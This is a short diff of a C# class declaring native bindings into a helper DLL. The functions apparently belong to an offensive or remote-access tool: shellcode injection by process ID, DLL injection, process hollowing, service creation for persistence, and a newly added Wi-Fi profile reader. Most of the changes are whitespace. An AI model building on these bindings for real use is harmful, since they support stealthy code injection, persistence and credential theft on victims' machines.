@@ -18,10 +18,10 @@ public class NativeMethods
             [MarshalAs(UnmanagedType.LPWStr)] string appName,
             [MarshalAs(UnmanagedType.LPWStr)] string argument
     );
-    
+
     [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
     public static extern int Inject(int procPID, byte[] shellcode, UIntPtr shellcodeSize);
-  
+
     [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
     public static extern IntPtr getResolution();
 
@@ -42,13 +42,19 @@ public class NativeMethods
     [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
     public static extern int createSrv(string appname, string srvname, string desc);
 
-	[DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
-	public static extern int InjectDll(int targetId, string dllLibFullPath);
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern int InjectDll(int targetId, string dllLibFullPath);
 
     [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
-	public static extern int HollowProcess(string targetimage, byte[] replacmentExe, int size);
+    public static extern int HollowProcess(string targetimage, byte[] replacmentExe, int size);
 
     [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
     public static extern bool isx64Exe(string path);
+
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern int getWifiProfiles(out IntPtr outPtr, out int length);
+    [DllImport("CppHelp.dll", CallingConvention = CallingConvention.Cdecl)]
+    public static extern int deleteBuffer(IntPtr buffer);
 }
+
 
